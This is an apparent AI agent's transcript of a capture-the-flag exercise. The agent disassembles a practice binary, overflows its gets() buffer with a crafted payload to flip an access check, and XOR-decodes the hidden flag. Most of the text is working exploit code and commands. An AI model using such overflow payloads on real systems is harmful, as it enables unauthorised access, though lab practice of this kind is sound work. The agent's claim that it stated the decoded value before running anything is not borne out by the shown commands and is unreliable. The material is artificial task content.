@@ -1,0 +1,39 @@
+$ pwd && ls -la && ls -la /app 2>/dev/null
+$ cd /app && file vulnerable; echo "--- strings ---"; strings -n 4 vulnerable | head -n 80; echo "--- run (no input) ---"; timeout 5 ./vulnerable < /dev/null; echo "exit=$?"
+$ cd /app && for t in objdump readelf gdb python3 gcc; do printf '%s: ' "$t"; command -v "$t" || echo "missing"; done; echo "--- ELF header ---"; readelf -h vulnerable | grep -E 'Type|Entry'; echo "--- .rodata / .data ---"; objdump -s -j .rodata -j .data vulnerable; echo "--- .text disassembly ---"; objdump -d -M intel --no-show-raw-insn vulnerable | sed -n '/Disassembly of section .text:/,/Disassembly of section .fini:/p' | head -n 260
+$ python3 - <<'EOF'
+import subprocess, re
+
+# Runtime check: gets() overflows the 0x40-byte buffer; the int at [rsp+0x40] must be 1.
+payload = b'A' * 64 + b'\x01\x00\x00\x00' + b'\n'
+proc = subprocess.run(['/app/vulnerable'], input=payload, capture_output=True, timeout=10)
+out = proc.stdout.decode(errors='replace')
+print('--- program output (rc=%d) ---' % proc.returncode)
+print(out)
+m = re.search(r'FLAG\{[^}\s]*\}', out)
+
+# Static check: XOR blob at .data 0x404060..0x404084 with key 0x42 (terminator 0x42 at 0x404085).
+blob = bytes([0x04,0x0e,0x03,0x05,0x39,0x20,0x76,0x24,0x24,0x71,0x30,0x1d,0x72,0x34,0x71,0x30,
+              0x24,0x2e,0x72,0x35,0x1d,0x2f,0x76,0x31,0x36,0x71,0x30,0x1d,0x29,0x71,0x3b,0x1d,
+              0x70,0x72,0x70,0x76,0x3f])
+static = ''.join(chr(b ^ 0x42) for b in blob)
+print('static decode:', static)
+
+flag = m.group(0) if m else static
+if m and m.group(0) != static:
+    print('WARNING: runtime and static decodes differ; using runtime value')
+
+with open('/app/results.txt', 'w') as f:
+    f.write(flag + '\n')
+print('--- /app/results.txt ---')
+print(open('/app/results.txt').read(), end='')
+EOF
+$ echo COMPLETE_TASK_AND_SUBMIT_FINAL_OUTPUT
+I extracted the secret and saved it to `/app/results.txt`:
+
+`FLAG{b4ff3r_0v3rfl0w_m4st3r_k3y_2024}`
+
+- **Analysis:** `/app/vulnerable` is a stripped x86-64 binary. Its `.text` section shows that the input routine calls `gets()` into a 64-byte stack buffer, then checks whether the integer at offset 0x40 equals 1. If it does, the program runs a `ptrace` anti-debug check and XOR-decodes a 37-byte secret stored in `.data` at 0x404060 with key 0x42.
+- **Exploit:** I sent 64 bytes of padding followed by `01 00 00 00`, which overflowed the buffer and set that flag. The program printed `Access granted! Secret: FLAG{...}`.
+- **Verification:** I decoded the `.data` bytes separately with the XOR key, and the result matched the runtime output. I had stated the decoded value before running anything, so the runtime and static agreement is what confirms it.
+- **Output:** The flag is written to `/app/results.txt` with a trailing newline, and I read the file back to confirm its contents.
